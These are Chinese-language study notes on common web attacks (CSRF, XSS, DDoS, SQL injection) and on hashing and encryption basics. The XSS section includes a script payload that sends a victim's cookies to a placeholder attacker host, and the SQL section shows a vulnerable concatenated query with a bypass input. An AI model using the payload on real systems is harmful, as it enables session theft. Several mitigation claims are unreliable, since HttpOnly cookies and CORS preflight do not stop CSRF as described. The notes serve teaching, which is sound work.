## 网络攻击

### CSRF攻击

全称是跨站请求伪造（Cross Site Request Forgery）。

`CSRF`是通过伪装来自受信任的用户的请求来利用受信任的网站。攻击者盗用了用户的身份，以用户的名义向第三方网站发起恶意请求，可能会利用用户的身份进行转账等危险操作。

**简介：**用户A登录了网站B，网站B在用户A的浏览器上存了`cookie`信息，这时候用户A没有登出网站B，转换又去访问网站C，网站C中有一个链接点击后会对网站B发起恶意访问请求。用户A点击后，对网站B发起了请求。如果没有跨域访问限制，这时候网站B便执行了用户A的请求，导致恶意转账等结果。

**解决手段：**

1. 将`cookie`设置为`HttpOnly`，这样就不能通过js去获取`cookie`信息了。

2. 增加 `token`：

   在请求中放入攻击者所不能伪造的信息，并且该信息不存在与`cookie`中。例如在请求中以参数形式加入一个随机生成的`token`，并且在服务端进行`token`校验，如果请求中没有有效的`token`，则拒绝该请求。

   假设请求通过`POST`方式提交，则可以在相应的表单中增加一个隐藏域：`<input type="hidden" name="csrf_token" value="csrf_token_value">`，`token` 的值通过服务端生成，表单提交后`token`的值通过 `POST` 请求与参数一起带到服务端，每次会话可以使用相同的`token`，会话过期 `token` 失效，攻击者无法获取`token`，所以也就无法伪造请求。

3. `cros`跨域资源共享：

   > `cros`配置：
   >
   > 1. 服务器配置可以发起访问的域，以及请求方法，请求头部信息。
   > 2. 对于简单请求，用户在发送请求时，浏览器会自动添加 `Origin` 头部信息。
   > 3. 对于复杂请求，浏览器先发送一次带有 `Origin` 字段的 `OPTION` 请求，检测是否允许跨域访问，然后再发送真实请求。
   > 4. 服务器会判断请求头部的`Origin`信息是否在已配置的 `AllowedOrigin` 中。
   > 5. 服务器响应头部信息中包含配置的 `Access-Control-Allow-Origin` 以及是否允许携带cookie等字段。
   > 6. 浏览器检测到 `Origin` 字段中的值若存在于  `Access-Control-Allow-Origin` 字段中便会将数据显示给用户。
   > 7. 浏览器检测到 `Origin` 字段中的值不存在于  `Access-Control-Allow-Origin` 字段中便会忽略响应，并报错。

   `cors`跨域资源共享可以有效的抵御`csrf`攻击，用户A浏览网站C时发起恶意请求时，由于恶意请求属于非简单请求，浏览器会先发送一次带有 `Origin` 字段的 `OPTION` 请求，检测是否允许跨域访问，这时浏览器响应头部信息的 `Access-Control-Allow-Origin` 字段中没有 `Origin` 字段的值，因此不会发起真正的请求。



### XSS攻击

全称是跨站脚本攻击（Cross Site Scripting）。

**简介：** 攻击者在网页中嵌入恶意脚本程序，当用户打开该网页时，脚本程序便开始在用户的浏览器上执行，盗取用户的 `cookie` 、用户名密码、下载执行病毒木马程序，甚至是获取客户端admin权限。

**原理：** 我现在做了个博客系统，然后有一个用户在博客上发布了一篇文章，内容是`<script>window.open("www.gongji.com?param="+document.cookie)</script>`，如过我没有对它做处理，直接存到数据库里，当别的用户读取文章后，浏览器会执行这段js脚本，然后发起恶意攻击。

**解决手段：**对用户输入的数据进行过滤和转义。

### DDos攻击

全称是分布式拒绝服务（Distributed Denial of Service）。

**简介：**是目前最强大、最难以防御的攻击方式之一。攻击者利用很多设备在同一时间对目标进行大量访问请求，耗尽服务器资源，导致服务器无法正常响应。

**解决方案：**

- DDos攻击很难有效防御，可以通过购买更多的带宽

- 使用多台服务器，并部署在不同的数据中心
- 将静态资源部署到CDN上，利用CDN，就近访问，提高访问速度，同时又避免了服务器被攻击
- 开启路由器反ip欺骗

### SQL注入攻击

SQL注入就是把SQL命令伪装成正常的HTTP请求参数，传递到服务端，欺骗服务器执行恶意的SQL命令。

**简介：**我现在做了个网站，用户登录时，调用的后台接口中有一段代码中SQL语句是这么写的：`"SELECT username FROM user WHERE username = " + username + " AND password = (" + password + ")"`，用户如果输入的用户名是 `xxx`，密码是 `password OR 1 = 1`，那么这条SQL语句将会查询出用户的信息，并且可以绕过检查直接登录成功。

**解决方案：**

- 使用预编译的语句，预编译语句使用参数占位符来替代需要动态传入的参数，这时程序会将用户输入的 `password OR 1 = 1`当做普通字符串来处理，攻击者便无法概念SQL语句的结构。
- 使用`ORM`框架，流行的`ORM`框架都对相应的关键字进行了转义。
- 避免以明文方式存放密码，这样攻击者便无法通过SQL注入攻击获取用户的密码。

## 数字摘要

数字摘要也称为消息摘要，它是一个唯一对应于一个消息的固定长度的值，由一个单向`Hash`函数对消息进行计算而产生。接受者对收到的消息采用相同的`Hash`函数重新计算，将新生成的摘要与原摘对比，如果不相同，则说明消息在传递的过程中改变了。

消息摘要的特点：

1.  长度固定，与消息长度无关。
2.  一般不同消息生成的摘要不同，相同的消息生成的摘要一定相同。
3.  不能重摘要中恢复原消息。

### MD5

`MD5`是数字摘要算法的一种实现，它可以从任意长度的明文字符生成128位的hash值。

MD5算法的过程分为四步：处理原文，设置初始值，循环加工，拼接结果。

1.  先计算出原文比特长度，然后对512求余，如果余数不等于448，就填充原文使得原文对512求余的结果等于448。填充的方法是第一位填充1，其余位填充0，填充完后，信息的长度就是 512 * N + 448。用剩余的位置64位记录原文的真正长度，这样处理后的信息长度就是 512 * (N + 1)。
2.  MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。
3.  循环加工，每一次循环都会让旧的A、B、C、D产生新的A、B、C、D。假设处理的原文长度是M，主循环次数 = M / 512，每个主循环中包含 512 / 32 * 4 = 64次子循环。所以消息越大，MD5运算越慢。
4.  拼接结果。

### SHA

`SHA`是安全散列算法，它可以从任意长度的明文字符生成160位的hash值。由于生成的摘要信息更长，运算更加复杂，所以比`MD5`运行速度慢，但是也更安全。

### Base64编码

由于计算出的摘要需要转换为字符串，可能会产生一些无法显示或者网络传输的控制字符，所以需要对摘要字符串进行编码。

`Base64`是一种基于64个可打印字符来表示二进制数据的方法，由于 `2 ^ 6 = 64` ，所以每6位字符为1个单元，3个字节刚好对应4个 `Base64` 单元，即3个字节用4个可打印字符表示。

`Base64` 只是一种编码算法，可以通过固定的方法逆向得到编码之前的信息，所以不能作为一种加密算法使用。

## 对称加密算法

即加密和解密使用同一个秘钥的加密算法。

对称加密算法的特点：

-   算法公开
-   计算量小
-   加密速度快
-   加密效率高
-   安全性依赖于秘钥，秘钥一旦泄露就失去了安全性

常见的对策加密算法有：`DES`算法、`3DES`算法、`AES`算法等。

## 非对称加密算法

非对称加密算法需要公钥和私钥配对使用。用公钥加密，只有私钥才能解密；使用私钥加密，只有公钥才能解密。

非对称加密算法的特点：

-   只要保证私钥的安全性就能保证加密算法的安全性
-   只需要传递公钥，大大提高了秘钥传输的安全性
-   由于算法的复杂性，其加解密速度远慢于对称加密算法

非对称加密算法实现机密信息交换的基本过程：

1.  甲生成一对秘钥，并把一把作为公钥，向其他人公开。
2.  乙得到该公钥后使用它对机密信息进行加密后发生给甲。
3.  甲使用私钥对加密后的信息进行解密得到原文。

为了达到时间和安全的平衡，通常利用对称加密算法加密较长的文件，用非对称加密算法传递加密文件的对称加密算法的秘钥。

常见的非对称加密算法：`RSA`算法。